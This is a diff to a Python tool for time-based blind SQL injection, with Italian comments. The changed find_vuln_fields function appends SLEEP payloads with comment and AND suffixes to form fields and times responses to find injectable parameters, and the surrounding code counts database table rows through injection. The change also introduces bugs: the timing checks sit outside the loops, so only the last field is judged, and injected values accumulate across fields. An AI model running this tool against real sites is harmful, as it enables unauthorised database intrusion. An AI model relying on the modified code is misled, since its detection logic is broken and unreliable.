@@ -12,7 +12,7 @@ import requests, sys, ast, binascii, argparse, threading
 M_GET = 'GET'
 M_POST = 'POST'
 
-EVALUATING_ROUNDS = 100 # Numero di esecuzioni per determinare il tempo di risposta del server
+EVALUATING_ROUNDS = 10 # Numero di esecuzioni per determinare il tempo di risposta del server
 threads_num = 1
 
 SQL_SUFFIX_TYPE = ['', '-- -', 'AND \'1\'=\'1']
@@ -129,9 +129,9 @@ def measure_request_time_no_threads(url, method, headers, cookies, data):
         return r.elapsed.total_seconds()
     elif method == M_POST:
         r = requests.post(url, headers = headers, cookies = cookies, data = data.items())
-    	return r.elapsed.total_seconds()
+        return r.elapsed.total_seconds()
     else:
-    	return -1;
+        return -1;
 
 # Misura il tempo di risposta di una richiesta o il tempo medio di richieste multiple
 def measure_request_time(url, method, headers, cookies, data):
@@ -166,48 +166,46 @@ def evaluate_sleep_time(response_time):
     else:
         return response_time
 
-# Determina quali dei campi passati al tool sono iniettabili
+# Determina quali dei campi passati al tool sono iniettabili e che ti di injection utilizzare ('-- -', '\' AND \'1\'=\'1', '')
 def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
     vuln_fields = {}
     sql = '{} AND SLEEP({}) {}'
-
     m_data = data.copy()
-    m_data_2 = data.copy()
-    #TODO: valutare se eliminare m_data_2 ed usare solo m_data
-    for field in m_data:
-        m_data_2[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
-        elapsed = measure_request_time(url, method, headers, cookies, m_data_2)
-        if elapsed >= sleep_time:
-            vuln_fields.update({field:COMMENT_SUFF})
 
-    for f in vuln_fields:
-        m_data.pop(f)
+    for field in m_data:
+        m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
+        # m_data[field] = data[field]
+    if elapsed >= sleep_time:
+        vuln_fields.update({field:COMMENT_SUFF})
+    for field in vuln_fields:
+        m_data.pop(field)
 
     if len(m_data) == 0:
         return vuln_fields
 
     for field in m_data:
-        m_data_2[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF])
-        elapsed = measure_request_time(url, method, headers, cookies, m_data_2)
-        if elapsed >= sleep_time:
-            vuln_fields.update({field:AND_SUFF})
-
-    for f in vuln_fields:
-        m_data.pop(f)
+        m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF])
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
+    if elapsed >= sleep_time:
+        vuln_fields.update({field:AND_SUFF})
+    for field in vuln_fields:
+        m_data.pop(field)
 
     if len(m_data) == 0:
         return vuln_fields
 
     for field in m_data:
-        m_data_2[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
-        elapsed = measure_request_time(url, method, headers, cookies, m_data_2)
-        if elapsed >= sleep_time:
-            vuln_fields.update({field:NO_SUFF})
+        m_data[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
+    if elapsed >= sleep_time:
+        vuln_fields.update({field:NO_SUFF})
 
-    for f in vuln_fields:
-        m_data.pop(f)
+    for field in vuln_fields:
+        m_data.pop(field)
 
     return vuln_fields
+
 
 # Determina il numero di righe di una tabella del database
 def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_type, db_name, table_name, sleep_time, where_param = '', where_value = ''):
